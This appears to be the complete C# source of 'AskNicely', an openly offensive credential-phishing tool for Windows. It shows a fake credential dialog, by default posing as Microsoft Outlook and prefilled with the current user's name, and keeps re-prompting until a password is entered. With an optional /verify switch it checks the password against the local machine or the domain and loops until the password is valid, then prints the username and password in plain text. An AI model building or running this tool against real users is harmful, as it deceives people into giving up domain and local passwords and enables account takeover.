using System;
using System.Collections.Generic;
using System.DirectoryServices.AccountManagement;
using System.DirectoryServices.ActiveDirectory;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace AskNicely
{
	public class Program
	{
		#region DLL imports and structs
		[DllImport("credui.dll", CharSet = CharSet.Auto)]
		private static extern bool CredUnPackAuthenticationBuffer(int dwFlags, IntPtr pAuthBuffer, uint cbAuthBuffer, StringBuilder pszUserName, ref int pcchMaxUserName, StringBuilder pszDomainName, ref int pcchMaxDomainame, StringBuilder pszPassword, ref int pcchMaxPassword);

		[DllImport("credui.dll", CharSet = CharSet.Auto)]
		private static extern int CredUIPromptForWindowsCredentials(ref CREDUI_INFO notUsedHere, int authError, ref uint authPackage, IntPtr InAuthBuffer, int InAuthBufferSize, out IntPtr refOutAuthBuffer, out uint refOutAuthBufferSize, ref bool fSave, int flags);

		[DllImport("credui.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		private static extern Boolean CredPackAuthenticationBuffer(int dwFlags, string pszUserName, string pszPassword, IntPtr pPackedCredentials, ref int pcbPackedCredentials);


		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
		private struct CREDUI_INFO
		{
			public int cbSize;
			public IntPtr hwndParent;
			public string pszMessageText;
			public string pszCaptionText;
			public IntPtr hbmBanner;
		}
		#endregion DLL imports and structs

		const int CREDUIWIN_GENERIC = 0x01;
		const int CREDUIWIN_CHECKBOX = 0x2;
		internal const int CREDUI_MAX_USERNAME_LENGTH = 513;


		private static void GetInputBuffer(string user, out IntPtr inCredBuffer, out int inCredSize)
		{
			//The CredPackAuthenticationBuffer function
			if (!string.IsNullOrEmpty(user))
			{
				inCredSize = 1024;
				inCredBuffer = Marshal.AllocCoTaskMem(inCredSize);
				if (CredPackAuthenticationBuffer(0, user, pszPassword: "", inCredBuffer, ref inCredSize))
					return;
			}
			inCredBuffer = IntPtr.Zero;
			inCredSize = 0;
		}

		private static string[] PromptUserForCreds(string customTitle, string customMessage)
		{
			//Get the current NetBIOS/domain + username and set as prefill in prompt
			WindowsIdentity identity = WindowsIdentity.GetCurrent();
			WindowsPrincipal principal = new WindowsPrincipal(identity);
			GetInputBuffer(principal.Identity.Name, out var inCredBuffer, out var inCredSize);

			//The CredUIPromptForWindowsCredentials function 
			bool save = false;
			int errorcode = 0;
			uint authPackage = 0;
			IntPtr outCredBuffer;
			uint outCredSize;

			CREDUI_INFO credui = new CREDUI_INFO();
			credui.cbSize = Marshal.SizeOf(credui);
			credui.pszCaptionText = customTitle;
			credui.pszMessageText = customMessage;
			int result = CredUIPromptForWindowsCredentials(ref credui, errorcode, ref authPackage, inCredBuffer, inCredSize, out outCredBuffer, out outCredSize, ref save, CREDUIWIN_GENERIC | CREDUIWIN_CHECKBOX);

			//The CredUnPackAuthenticationBuffer function
			if (result == 0)
			{
				var maxUserName = CREDUI_MAX_USERNAME_LENGTH;
				var maxDomain = CREDUI_MAX_USERNAME_LENGTH;
				var maxPassword = CREDUI_MAX_USERNAME_LENGTH;
				var usernameBuf = new StringBuilder(maxUserName);
				var passwordBuf = new StringBuilder(maxPassword);
				var domainBuf = new StringBuilder(maxDomain);

				if (CredUnPackAuthenticationBuffer(0, outCredBuffer, outCredSize, usernameBuf, ref maxUserName, domainBuf, ref maxDomain, passwordBuf, ref maxPassword))
				{

					var username = usernameBuf.ToString();
					var password = passwordBuf.ToString();
					var domain = domainBuf.ToString();

					var creds = new[] { username, password, domain };
					return creds;
				}
			}
			//if cancel or close is clicked, an empty string is returned and the prompt restarts
			var empty = new[] { "", "" };
			return empty;
		}


		private static bool ValidateMachineCredentials(string netbiosUsername, string password)
		{
			var netbiosUserSplit = netbiosUsername.Split('\\');

			PrincipalContext context = new PrincipalContext(ContextType.Machine);
			bool valid = context.ValidateCredentials(netbiosUserSplit[1].ToString(), password);

			if (valid == true)
			{
				return true;
			}
			return false;
		}


		private static bool ValidateDomainCredentials(string domainUsername, string password)
		{
			var domainUserSplit = domainUsername.Split('\\');

			PrincipalContext context = new PrincipalContext(ContextType.Domain);
			bool valid = context.ValidateCredentials(domainUserSplit[1].ToString(), password);

			if (valid == true)
			{
				return true;
			}
			return false;
		}


		public static void logo()
		{
			Console.WriteLine(@"


 █████  ███████ ██   ██ ███    ██ ██  ██████ ███████ ██      ██    ██ 
██   ██ ██      ██  ██  ████   ██ ██ ██      ██      ██       ██  ██  
███████ ███████ █████   ██ ██  ██ ██ ██      █████   ██        ████   
██   ██      ██ ██  ██  ██  ██ ██ ██ ██      ██      ██         ██    
██   ██ ███████ ██   ██ ██   ████ ██  ██████ ███████ ███████    ██                                                                       
");
		}


		public static void help()
		{
			string help = @"
Optional arguments:                     Discription:
-------------------                     ------------
/help                                   This help menu
/verify                                 Validates submitted credentials in the context of the local system or domain
/title:<title>                          Custom title of the credential prompt
/message:<whatever message>             Custom message shown in the credential prompt


Usage examples:
---------------
Simple credential prompt with default Outlook text: AskNicely.exe
Customized prompt with creds verification: AskNicely.exe /verify /title:""Custom title"" /message:""Custom message""
";

			Console.WriteLine(help + "\n");
		}


		static void Main(string[] args)
		{
			try
			{
				//default title and message in prompt
				string customTitle = "Microsoft Outlook";
				string customMessage = "Enter your credentials to connect to Outlook";
				string currentDomain = "";

				logo();

				var arguments = new Dictionary<string, string>();
				foreach (var argument in args)
				{
					var idx = argument.IndexOf(':');
					if (idx > 0)
						arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
					else
						arguments[argument] = string.Empty;
				}


				if (arguments.ContainsKey("/help") || arguments.ContainsKey("-h"))
				{
					help();
				}

				else
				{
					if (arguments.ContainsKey("/title"))
					{
						customTitle = (arguments["/title"]);
					}

					if (arguments.ContainsKey("/message"))
					{
						customMessage = (arguments["/message"]);
					}

					if (arguments.ContainsKey("/verify"))
					{
						while (true)
						{
							var credentials = PromptUserForCreds(customTitle, customMessage);

							//checks if a password is submitted and returned
							if (credentials[1].Length != 0)
							{
								try
								{
									currentDomain = Domain.GetCurrentDomain().ToString();
								}
								catch { }

								if (currentDomain.Length != 0)
								{
									//checks if the local user credentials are valid
									bool credCheck = ValidateDomainCredentials(credentials[0], credentials[1]);
									if (credCheck == true)
									{
										Console.WriteLine($"[+] Valid domain user credentials submitted:\nUsername: {credentials[0]}\nPassword: {credentials[1]}\n");
										break;
									}
								}
								else
								{
									//checks if the domain credentials are valid
									bool credCheck = ValidateMachineCredentials(credentials[0], credentials[1]);
									if (credCheck == true)
									{
										Console.WriteLine($"[+] Valid local user credentials submitted:\nUsername: {credentials[0]}\nPassword: {credentials[1]}\n");
										break;
									}
								}
								Console.WriteLine($"[-] Invalid credentials submitted:\nUsername: {credentials[0]}\nPassword: {credentials[1]}\n");
							}
						}
					}
					else
					{
						while (true)
						{
							var credentials = PromptUserForCreds(customTitle, customMessage);

							//checks if a password is submitted and returned
							if (credentials[1].Length != 0)
							{
								Console.WriteLine($"[+] Credentials submitted (not verified):\nUsername: {credentials[0]}\nPassword: {credentials[1]}\n");
								break;
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.Message);
			}
		}
	}
}
